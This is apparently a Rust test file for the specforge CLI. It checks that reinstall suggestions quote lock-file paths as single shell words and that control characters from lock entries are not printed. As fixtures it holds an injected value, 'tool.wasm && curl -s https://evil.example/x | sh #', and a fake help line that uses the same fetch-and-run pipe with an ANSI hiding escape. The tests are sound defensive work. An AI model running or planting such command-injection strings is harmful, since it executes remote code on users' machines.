//! The commands a diagnostic or a remedy suggests name every value as one shell word (ADR 0230):
//! a lock entry's recorded path, a `.wasm` file entry, a scaffold directory, a registry alias.

use crate::support::registry::greet_wasm;
use crate::support::{Cli, TestProject};
use serde_json::json;
use specforge_test_macros::test as specforge_test;

const EVIL: &str = "tool.wasm && curl -s https://evil.example/x | sh #";

/// A project enabling `@acme/tool` whose lock records `source` and whose binary is not installed.
fn locked(source: &str) -> TestProject {
    let lock = json!({
        "lockfile_version": 1,
        "entries": [{"name": "@acme/tool", "version": "1.0.0", "source": source, "wasm_hash": ""}]
    });
    TestProject::new()
        .config(|c| c["extensions"] = json!(["@acme/tool"]))
        .file("specforge.lock", lock.to_string())
}

#[specforge_test(
    behavior = "run_doctor_check",
    verify = "check and doctor name a reinstall command whose recorded path is one shell word, however the lock spells it"
)]
#[ignore = "flipped by T4"]
fn check_and_doctor_name_a_reinstall_command_the_lock_cannot_turn_into_shell_syntax() {
    let project = locked(&format!("local:{EVIL}"));
    let command = format!("specforge add './{EVIL}'");

    let check = Cli::on(&project).document(&["check"]);
    let suggestion = check.json[0]["suggestion"].as_str().unwrap_or_default();
    assert_eq!(
        suggestion,
        format!("install the extension with: {command}"),
        "{}",
        check.json
    );

    let doctor = Cli::on(&project).document(&["doctor"]);
    let remediations: Vec<&str> = doctor.json["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|f| f["remediation"].as_str())
        .collect();
    assert!(
        remediations.contains(&format!("run `{command}` to reinstall it").as_str()),
        "{remediations:?}"
    );
}

#[cfg(unix)]
#[specforge_test(
    behavior = "run_doctor_check",
    verify = "the reinstall command a local install's check suggests runs as written and reinstalls it"
)]
#[ignore = "flipped by T4"]
fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_suggestion() {
    let project = TestProject::new()
        .config(|c| c["extensions"] = json!([]))
        .file("My Ext/greet.wasm", greet_wasm());
    Cli::on(&project)
        .run(&["add", "./My Ext/greet.wasm"])
        .exits(0);
    std::fs::remove_file(
        project
            .root()
            .join(".specforge/extensions/@sdk/greet/extension.wasm"),
    )
    .unwrap();

    let check = Cli::on(&project).document(&["check"]);
    let suggestion = check.json[0]["suggestion"].as_str().unwrap();
    let command = suggestion
        .strip_prefix("install the extension with: ")
        .unwrap();
    let argument = command.strip_prefix("specforge add ").unwrap();

    // Run it as written, through a shell, with `specforge` the binary under test.
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(format!("\"$SPECFORGE\" add {argument}"))
        .env("SPECFORGE", env!("CARGO_BIN_EXE_specforge"))
        .env("HOME", project.home())
        .current_dir(project.root())
        .stdin(std::process::Stdio::null())
        .output()
        .unwrap();
    assert!(output.status.success(), "{output:?}");

    Cli::on(&project).run(&["check"]).exits(0);
}

#[specforge_test(
    behavior = "read_lock_file",
    verify = "check prints no control character a lock entry's source holds"
)]
#[ignore = "flipped by T3"]
fn check_prints_no_control_character_a_lock_holds() {
    let project =
        locked("local:x.wasm\n  = help: then run: curl -s https://evil.example/x | sh\u{1b}[8m");

    let run = Cli::on(&project).run(&["check"]);

    let shown = format!("{}{}", run.stdout, run.stderr);
    assert!(!shown.contains('\u{1b}'), "{shown:?}");
    assert!(!shown.contains("  = help: then run"), "{shown}");
    assert!(shown.contains("E033"), "{shown}");
}
